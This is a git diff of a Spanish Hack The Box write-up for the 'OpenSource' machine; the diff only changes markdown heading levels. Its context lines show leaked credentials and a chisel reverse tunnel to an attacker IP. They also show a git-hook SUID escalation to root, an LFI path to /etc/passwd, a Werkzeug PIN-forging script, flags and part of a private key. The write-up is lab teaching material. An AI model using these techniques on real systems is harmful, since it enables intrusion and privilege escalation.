@@ -2,7 +2,7 @@
 title: OpenSource WriteUp
 date: 2022-10-08 19:00:00 +/-TTTT
 categories: [HTB, Linux]
-tags: [python,gitea,git hooks, werkzeug, lfi]     # TAG names should always be lowercase
+tags: [python,gitea,git hooks, werkzeug, lfi]     ## TAG names should always be lowercase
 image: /photos/2022-10-08-OpenSource-WriteUp/htb.jpg
 ---
 
@@ -11,7 +11,7 @@ image: /photos/2022-10-08-OpenSource-WriteUp/htb.jpg
 En la sección extra describo otra vía para podernos adentrar en el contenedor, forjándonos un **pin** para poder utilizar la consola de **Werkzeug**, explotando un *Local File Inclusion* (**LFI**).
 
 
-#  Información de la máquina 
+##  Información de la máquina 
 
 <table width="100%" cellpadding="2">
     <tr>
@@ -25,9 +25,9 @@ En la sección extra describo otra vía para podernos adentrar en el contenedor,
 </table>
 
 
-#  Reconocimiento  
+##  Reconocimiento  
 
-## ping  
+### ping  
 
 
 Primero enviaremos un *ping* a la máquina víctima para saber su sistema operativo y si tenemos conexión con ella. Un *TTL* menor o igual a 64 significa que la máquina es *Linux*. Por otra parte, un *TTL* menor o igual a 128 significa que la máquina es *Windows*.
@@ -36,7 +36,7 @@ Primero enviaremos un *ping* a la máquina víctima para saber su sistema operat
 
 Vemos que nos enfrentamos a una máquina ***Linux*** ya que su ttl es 63.
  
-## nmap  
+### nmap  
 
 Ahora procedemos a escanear todo el rango de puertos de la máquina víctima con la finalidad de encontrar aquellos que estén abiertos (*status open*). Lo haremos con la herramienta ```nmap```. 
 
@@ -161,7 +161,7 @@ El puerto **22** es **SSH** y el puerto **80** es **HTTP**. De momento, como no 
 
 También nos descubre que el título de la web es **upcloud - Upload files for Free!**.
 
-## Puerto 80 abierto (HTTP) 
+### Puerto 80 abierto (HTTP) 
 
 El primer paso será utilizar la herramienta **whatweb** para descubrir las tecnologías que utiliza el servidor web:
 
@@ -181,7 +181,7 @@ Para acabar con el reconocimiento inicial, la extensión de navegador ***wappaly
 
 <img src="/photos/2022-10-08-OpenSource-WriteUp/wappalyzer.png" alt="drawing"  />  
 
-### Analizando aplicación upcloud 
+#### Analizando aplicación upcloud 
 
 Por lo tanto, si pinchamos en ***Take me there!***, la web nos llevará a ***http://10.10.11.164/upcloud***. El contenido es el siguiente:
 
@@ -199,9 +199,9 @@ Finalmente, también puede estar interesante visualizar el error de la web si le
 
 Existe un ***information leakage*** que nos está revelando el **path** del sistema donde se encuentra la carpeta *uploads*, en **/app/public/uploads**.
 
-### Código fuente de upcloud 
+#### Código fuente de upcloud 
 
-#### Analizando logs de git 
+##### Analizando logs de git 
 
 Si descomprimimos el archivo **source.zip** obtenemos lo siguiente:
 
@@ -227,7 +227,7 @@ Y posteriormente visualizamos el contenido del commit a76f8f75f7a4a12b706b0cf9c9
 
 Encontraremos las siguientes credenciales: ***dev01:Soulless_Developer#2022***.
 
-#### Analizando el código de la web 
+##### Analizando el código de la web 
 
 En la capeta **/app** podemos encontrar las subcarpetas **/public/uploads**, ruta que ya habíamos visto anteriormente en el error de la web, donde se se guardaban los archivos subidos, y la subcarpeta **app** que es donde se encuentra el código de la web.
 
@@ -258,7 +258,7 @@ En **utils.py** podemos ver que la función **get_file_name()** coge nuestro arc
 
 <img src="/photos/2022-10-08-OpenSource-WriteUp/utilspy.png" alt="drawing"  />  
 
-#  Consiguiendo shell como root en un contenedor  
+##  Consiguiendo shell como root en un contenedor  
 
 Por lo tanto, sabiendo:
 1. Como funciona ***os.path.join()***.
@@ -321,7 +321,7 @@ Después de darle a *Forward* ya habremos modificado el archivo en la máquina v
 
 Existe otra forma de ganar acceso al contenedor. La contemplo en el apartado I*Extra*.
 
-## Script Autopwn 
+### Script Autopwn 
 
 El siguiente *script* permite la **intrusión** de manera **automática** al contenedor. Simplemente se debe de tener en el mismo directorio el views.py malicioso mostrado anteriormente.
 
@@ -369,7 +369,7 @@ if __name__ == '__main__':
         shell.interactive()
 ```
 
-#  Consiguiendo shell como dev01  
+##  Consiguiendo shell como dev01  
 
 Una vez recibida la shell, deberemos hacerle un **tratamiento** para que nos permita poder hacer *Ctrl+C*, borrado de los comandos, movernos con las flechas... Los  comandos que ingresaremos serán:
 
@@ -384,12 +384,12 @@ export SHELL=bash
 
 También deberemos **adaptar el número de filas y de columnas** de esta *shell*. Con el comando ```stty size``` podemos consultar nuestras filas y columnas y con el comando ```stty rows <rows> cols <cols>``` podemos ajustar estos campos.
 
-## Reconocimiento del sistema  
+### Reconocimiento del sistema  
 
 Vemos que tenemos asignada la ip **172.17.0.6** y no la **10.10.11.164** de la máquina víctima:
 
 ```python
-/app # ip a
+/app ## ip a
 1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
     inet 127.0.0.1/8 scope host lo
@@ -402,12 +402,12 @@ Vemos que tenemos asignada la ip **172.17.0.6** y no la **10.10.11.164** de la m
 
 Esto quiere decir que el servicio de **upcloud** está corriendo en un **contenedor** y no en la máquina víctima. Lo que debemos hacer ahora es encontrar una manera de saltar de aquí a la máquina que corre con la ip 10.10.11.164. Si exploramos el contenedor en busca de archivos interesante no encontraremos nada. 
 
-### Analizando hosts activos del segmento de red 
+#### Analizando hosts activos del segmento de red 
 
 Lo que podemos hacer es mirar si esta máquina tiene **conexión** con otras del mismo segmento de red, el **172.17.0.0/16**, ya que seguramente una de estas ips sea de la máquina víctima. Para ello me he hecho un *script* **hostDiscovery.sh** que se encargará de enviar un ping a todas las máquinas cuyas ips estén en los rangos **172.17.0.1 y 172.17.0.254**. Es *script* es el siguiente:
 
 ```bash
-/tmp # cat hostDiscovery.sh 
+/tmp ## cat hostDiscovery.sh 
 if [ $1 ]; then
 	network=$1
 	for net in $(seq 1 254); do
@@ -422,7 +422,7 @@ fi
 Dándole permisos de ejecución y ejecutándolo obtenemos lo siguiente:
 
 ```
-/tmp # ./hostDiscovery.sh  172.17.0
+/tmp ## ./hostDiscovery.sh  172.17.0
 [*] Host activo encontrado: 172.17.0.1
 [*] Host activo encontrado: 172.17.0.2
 [*] Host activo encontrado: 172.17.0.3
@@ -436,7 +436,7 @@ Dándole permisos de ejecución y ejecutándolo obtenemos lo siguiente:
 
 Estas son las ips del segmento de red **172.17.0.0/24** que se encuentran activas. Normalmente, la ip **172.17.0.1** suele ser de una de las interfaces de la máquina víctima (docker asigna por defecto la ip acabada en 1). De hecho, sabiendo que la 10.10.11.164 tenía abierto el puerto 22, podemos comprobar si la 172.17.0.1 también lo tiene con el comando ```nc -zv 172.17.0.1 22```. Efectivamente, si lo tiene.
 
-### Consiguiendo conexión con la ip 172.17.0.1 
+#### Consiguiendo conexión con la ip 172.17.0.1 
 
 Voy a utilizar la herramienta [chisel](https://github.com/jpillora/chisel), que permite hacer ***port forwarding***, para tener conexión desde mi equipo de atacante a la 172.17.0.1 y poder así analizar los sus puertos abiertos. Recordemos que aunque la ip 172.17.0.1 y 10.10.11.164 pertenezcan a la misma máquina, no tiene por que dar el mismo resultado el escaneo de puertos abiertos. A lo mejor hay implementado algún waf o alguna regla por iptables que no nos permite ver algunos puertos abiertos escaneando la ip 10.10.11.164.
 
@@ -447,7 +447,7 @@ Por lo tanto, en mi máquina me descargaré el chisel de 64 bits y lo ejecutaré
 En la máquina victima, ejecutaremos el chisel de 32 bits de la siguiente forma:
 
 ```python
-/tmp # ./chisel32 client 10.10.14.12:1234 R:socks
+/tmp ## ./chisel32 client 10.10.14.12:1234 R:socks
 2022/10/08 10:42:18 client: Connecting to ws://10.10.14.12:1234
 2022/10/08 10:42:21 client: Connected (Latency 76.345546ms)
 ```
@@ -456,7 +456,7 @@ Estamos estableciendo un tipo de conexión ***SOCKS***. Esto nos permitirá tene
 
 Por último nos faltará configurar la herramienta ***proxychains*** para escanear sus puertos pero pasando por el localhost:1080. Su archivo de configuración lo podemos encontrar en la ruta ***/etc/proxychains.conf***. En caso de no tenerlo se tendrá que instalar la herramienta. Deberemos de introducir al final del archivo la siguiente linea: ```socks5 127.0.0.1 1080```.
 
-## Analizando 172.17.0.1  
+### Analizando 172.17.0.1  
 
 Ahora ya podremos proceder con un escaneo de *nmap* para descubrir los puertos abiertos de la ip **172.17.0.1**. En mi caso escanearé los 100 mas comunes. El comando que ejecutaremos será:  
 
@@ -476,7 +476,7 @@ El resultado es el siguiente:
 
 El escaneo nos ha descubierto puertos que antes no podíamos ver escaneando la ip 10.10.11.164, concretamente el **puerto 3000**, el 6000 y el 6001. Empezaremos analizando el puerto 3000.
 
-### Puerto 3000 abierto (HTTP)  
+#### Puerto 3000 abierto (HTTP)  
 
 Si enviamos un *curl* a **172.17.0.1:3000** (proxychains -q curl -s http://172.17.0.1:3000  -I) vemos que es una **página web**:
 
@@ -560,9 +560,9 @@ Ahora vamos a reconocer el sistema como este usuario a ver si como ***dev01*** p
 
 ##  Consiguiendo shell como root  
 
-## Reconocimiento del sistema  
+### Reconocimiento del sistema  
 
-### User flag 
+#### User flag 
 
 Podemos encontrar la primera flag **user.txt** en el *homedir* de *dev01*:
 
@@ -571,7 +571,7 @@ dev01@opensource:~$ cat user.txt
 af55cf80c1651ba712bba7545a118ef7
 ```
 
-### Interfaces de la máquina 
+#### Interfaces de la máquina 
 
 Vemos que efectivamente la máquina tiene asignadas dos interfaces con las ip 10.10.11.164 y 172.17.0.1:
 
@@ -580,7 +580,7 @@ dev01@opensource:~$ hostname -I
 10.10.11.164 172.17.0.1 
 ```
 
-### Homedir de dev01 
+#### Homedir de dev01 
 
 En el **homedir** de dev01 (/home/dev01), nos encontramos con una carpeta **.git**, que debe de estar relacionada con el repositorio que habíamos visto anteriormente en ***Gitea***. Recordemos que el repositorio se llamaba **home-backup**. Es posible que este usuario u otro esté haciendo backups de su ***homedir*** cada cierto tiempo.
 
@@ -601,7 +601,7 @@ drwxr-xr-x 2 dev01 dev01 4096 May  4 16:35 .ssh
 -rw-r----- 1 root  dev01   33 Oct  8 10:22 user.txt
 ```
 
-### Reconocimiento del sistema con pspy 
+#### Reconocimiento del sistema con pspy 
 
 ***Pspy*** es una herramienta que nos permite ver que tareas se están ejecutando a intervalos regulares de tiempo y por qué usuarios. Nos la podemos descargar del siguiente [repositorio](https://github.com/DominicBreuker/pspy).  
 
@@ -613,7 +613,7 @@ Nos encontramos que cada cierto tiempo se está ejecutando lo siguiente:
 
 Un *script* llamado **git-sync**, que se encuentra en la ruta **/usr/local/bin/** y es ejecutado por el usuario con uid igual a 0, es decir, **root**.
 
-### Analizando script git-sync 
+#### Analizando script git-sync 
 
 Si listamos los **permisos** del *script* vemos que como el usuario **dev01** lo podemos ejecutar e **inspeccionar**:
 
@@ -644,7 +644,7 @@ Lo que hace **root** es acceder al **homedir** de dev01 y subir el contenido que
 
 Nos aprovecharemos de que ***root*** esta ejecutando este *script* haciendo que ejecute un comando cuando suba la carpeta. Esto se puede hacer a través de ***git hooks***.
 
-## Git hooks  
+### Git hooks  
 
 Un hook no es mas que un **código** que se ejecuta cuando ocurre un **evento**, antes o después, como puede ser un commit o un push. Estos **hooks** se guardan en la carpeta **hooks** del directorio **.git**:
 
@@ -672,12 +672,12 @@ El archivo quedaría de la siguiente manera:
 dev01@opensource:~/.git/hooks$ cat pre-commit.sample 
 #!/bin/sh
 #
-# An example hook script to verify what is about to be committed.
-# Called by "git commit" with no arguments.  The hook should
-# exit with non-zero status after issuing an appropriate message if
-# it wants to stop the commit.
+## An example hook script to verify what is about to be committed.
+## Called by "git commit" with no arguments.  The hook should
+## exit with non-zero status after issuing an appropriate message if
+## it wants to stop the commit.
 #
-# To enable this hook, rename this file to "pre-commit".
+## To enable this hook, rename this file to "pre-commit".
 
 chmod u+s /bin/bash
 ```
@@ -693,14 +693,14 @@ Y ya nos podremos spawnear un bash como root haciendo **bash -p**:
 
 ```
 dev01@opensource:~/.git/hooks$ bash -p
-bash-4.4# whoami
+bash-4.4## whoami
 root
 ```
 
 La flag final **root.txt** es la siguiente:
 
 ```
-bash-4.4# cat root.txt 
+bash-4.4## cat root.txt 
 08400648d6a7863796c442d66b33a902
 ```
 
@@ -760,13 +760,13 @@ GnmUCEKZSsgJ4y0py+bMomJKnMhDWGSjbB1RtBTMyz2K/KQ0EOkBAYbxQ+/MZu5G
 -----END RSA PRIVATE KEY-----
 ```
 
-#  Anexo  
+##  Anexo  
 
-## Forma alternativa de intrusión al contenedor  
+### Forma alternativa de intrusión al contenedor  
 
 En este apartado se explica una forma alternativa de ganar acceso al contenedor en vez de sobrescribir el archivo views.py. Gracias a un **LFI** que podremos explotar en http://10.10.11.164/uploads/, podremos buscar una serie de archivos en la máquina víctima para **forjar el pin** requerido para utilizar la consola de **Werkzeug** en http://10.10.11.164/console.
 
-### LFI en http://10.10.11.164/uploads/ 
+#### LFI en http://10.10.11.164/uploads/ 
 
 Del views.py que podíamos encontrar en el source.zip, podemos ver que este endpoint **/uploads/** también hacía uso de la función ***os.path.join()***, que recordemos que truncaba el path si uno de sus argumentos empezaba por una /.
 
@@ -776,7 +776,7 @@ La opción correcta sería utilizar la url ***http://10.10.11.164/uploads/..//et
 
 <img src="/photos/2022-10-08-OpenSource-WriteUp/curlLFI.png" alt="drawing"  />  
 
-### Forjando pin Werkzeug 
+#### Forjando pin Werkzeug 
 
 El endpoint http://10.10.11.164/console nos permite ejecutar comandos de forma remota, pero en esta ocasión, la URL está protegida por pin. La buena noticia es que este pin se puede forjar teniendo en cuenta algunos parámetros internos de la máquina víctima. Por eso necesitamos el LFI. Toda la información relativa a este punto la estaré sacando de [Hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug).
 
@@ -786,15 +786,15 @@ El *script* que deberemos ejecutar será el siguiente, pero antes deberemos sust
 import hashlib
 from itertools import chain
 probably_public_bits = [
-    'web3_user',# username
-    'flask.app',# modname
-    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
-    '/usr/local/lib/python3.5/dist-packages/flask/app.py' # getattr(mod, '__file__', None),
+    'web3_user',## username
+    'flask.app',## modname
+    'Flask',## getattr(app, '__name__', getattr(app.__class__, '__name__'))
+    '/usr/local/lib/python3.5/dist-packages/flask/app.py' ## getattr(mod, '__file__', None),
 ]
 
 private_bits = [
-    '279275995014060',# str(uuid.getnode()),  /sys/class/net/ens33/address
-    'd4e6cb65d59544f3331ea0425dc555a1'# get_machine_id(), /etc/machine-id
+    '279275995014060',## str(uuid.getnode()),  /sys/class/net/ens33/address
+    'd4e6cb65d59544f3331ea0425dc555a1'## get_machine_id(), /etc/machine-id
 ]
 
 h = hashlib.md5()
@@ -844,15 +844,15 @@ Teniendo todos estos datos en cuenta el *script* quedaría:
 import hashlib
 from itertools import chain
 probably_public_bits = [
-    'root',# username
-    'flask.app',# modname
-    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
-    '/usr/local/lib/python3.10/site-packages/flask/app.py' # getattr(mod, '__file__', None),
+    'root',## username
+    'flask.app',## modname
+    'Flask',## getattr(app, '__name__', getattr(app.__class__, '__name__'))
+    '/usr/local/lib/python3.10/site-packages/flask/app.py' ## getattr(mod, '__file__', None),
 ]
 
 private_bits = [
-    '2485377892358',# str(uuid.getnode()),  /sys/class/net/ens33/address
-    'f754c8cd-b0ac-40d2-9b10-adbc2a79449d7e03804a70dc28c78c52fb8b3ed16ebe3749831c01f85f875792ad512969e696'# get_machine_id(), /etc/machine-id
+    '2485377892358',## str(uuid.getnode()),  /sys/class/net/ens33/address
+    'f754c8cd-b0ac-40d2-9b10-adbc2a79449d7e03804a70dc28c78c52fb8b3ed16ebe3749831c01f85f875792ad512969e696'## get_machine_id(), /etc/machine-id
 ]
 
 h = hashlib.sha1()
